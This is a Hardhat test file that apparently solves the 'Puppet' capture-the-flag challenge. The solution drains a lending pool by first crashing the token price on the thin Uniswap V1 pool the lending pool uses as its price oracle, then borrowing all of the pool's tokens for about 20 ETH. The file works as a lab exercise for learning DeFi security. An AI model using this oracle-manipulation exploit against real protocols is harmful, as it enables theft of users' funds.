const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
        (tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
    )
}

describe('[Challenge] Puppet', function () {
    let deployer, attacker;

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
    const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const PuppetPoolFactory = await ethers.getContractFactory('PuppetPool', deployer);

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x15af1d78b58c40000", // 25 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        this.token = await DamnValuableTokenFactory.deploy();

        // Deploy a exchange that will be used as the factory template
        this.exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        this.uniswapFactory = await UniswapFactoryFactory.deploy();
        await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await this.uniswapFactory.createExchange(this.token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        this.uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        this.lendingPool = await PuppetPoolFactory.deploy(
            this.token.address,
            this.uniswapExchange.address
        );
    
        // Add initial token and ETH liquidity to the pool
        await this.token.approve(
            this.uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );
        
        // Ensure Uniswap exchange is working as expected
        expect(
            await this.uniswapExchange.getTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        
        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('2'));

        expect(
            await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
    });

    it('Exploit', async function () {
      /**
       * @dev
       * Hack: the lending pool is using AMM spot prices as a price oracle (here from Uniswap), which can be easily exploited if we have enough funds to make a significant change in the ETH/token ratio of the AMM liquidity pool.
       * Here, we have 1000DVT, while the Uniswap pool only has 10. By transfering our DVT to the pool, We can therefore make a drastic change in the pool ratio, resulting in a significant devaluation of the DVT relative to ETH.
       * If the devaluation is large enough, we will be able to borrow 100,000DVT with the ETH funds we start with
       * Method:
       * 1- swap some of our DVT for ETH in the Uniswap pool => this will shift the spot price of the DVT/ETH pair
       * The UniswapV1 swap price model is as follow:
       * ETH_RECEIVED = 997 * DEPOSITED TOKEN * ETH_RESERVE / (TOKEN_RESERVE * 1000 + 997*DEPOSITED TOKEN)
       * If we deposit 999DVT:
       * ETH_RECEIVED = 997 * 999 * 10 / (10 * 1,000 + 997 * 999) ~= 9.9005 ETH
       * 
       * 2-After our swap, the DVT/ETH ratio in the pool is now:
       * 1 DVT ~= ((10 - 9.9005)/1010) ~= 9.85e-5 ETH
       * We call the price oracle from the lending pool to check what deposit is required to borrow all the DVT funds in the pool:
       * DEPOSIT_REQUIRED ~= ((10 - 9.9005)/1010) * 100,000 * 2 ~= 19.7 ETH 
       * We have enough ETH in our attacker funds to request the loan
       * 
       * 3- Borrow all the DVT tokens from the lending pool
       */
      await this.token
        .connect(attacker)
        .approve(
          this.uniswapExchange.connect(attacker).address,
          ATTACKER_INITIAL_TOKEN_BALANCE
        );
      console.log('\u001b[1;32mBalance approved');

      const logAttackerBalances = async (address, name) => {
        const ethBal = await ethers.provider.getBalance(address);
        const tokenBal = await this.token.balanceOf(address);

        console.log(
          `\u001b[1;33mETH Balance of ${name}:`,
          ethers.utils.formatEther(ethBal)
        );
        console.log(
          `\u001b[1;33mTKN Balance of ${name}:`,
          ethers.utils.formatEther(tokenBal)
        );
        console.log('');
      };

      await logAttackerBalances(attacker.address, 'attacker');
      await logAttackerBalances(this.uniswapExchange.address, 'uniswap');

      const logTokenPriceonUniswap = async (amount) => {
        const ethPayout = await this.uniswapExchange.getTokenToEthInputPrice(
          amount,
          {
            gasLimit: 1e6,
          }
        );

        console.log(
          `\u001b[1;36mSwapping ${ethers.utils.formatEther(
            amount
          )} tokens will give ${ethers.utils.formatEther(ethPayout)} ETH`
        );
      };

      await logTokenPriceonUniswap(ethers.utils.parseEther('999'));

      console.log('\u001b[1;35mSwapping 999 tokens for ETH');

      //Make sure to keep some tokens, otherwise you won't pass second success condition (token.balanceOf(attacker) needs to be strictly greater than POOL_INITIAL_TOKEN_BALANCE)
      await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
        ethers.utils.parseEther('999'), // Exact amount of tokens to transfer
        ethers.utils.parseEther('9'), // Min return of 9ETH
        (await ethers.provider.getBlock('latest')).timestamp * 2 // deadline
      );
      await logAttackerBalances(attacker.address, 'attacker');
      await logAttackerBalances(this.uniswapExchange.address, 'uniswap');

      const deposit = await this.lendingPool.calculateDepositRequired(
        POOL_INITIAL_TOKEN_BALANCE
      );
      console.log(
        '\u001b[1;36mDeposit required to take all the tokens from the pool:',
        ethers.utils.formatEther(deposit)
      );
      console.log(`\u001b[1;35mStarting the final attack: borrowing all the pool's DVT tokens `);
      await this.lendingPool
        .connect(attacker)
        .borrow(POOL_INITIAL_TOKEN_BALANCE, {
          value: deposit,
        });

      await logAttackerBalances(attacker.address, 'attacker');
      await logAttackerBalances(this.lendingPool.address, 'lending pool');
      /** CODE YOUR EXPLOIT HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
    });
});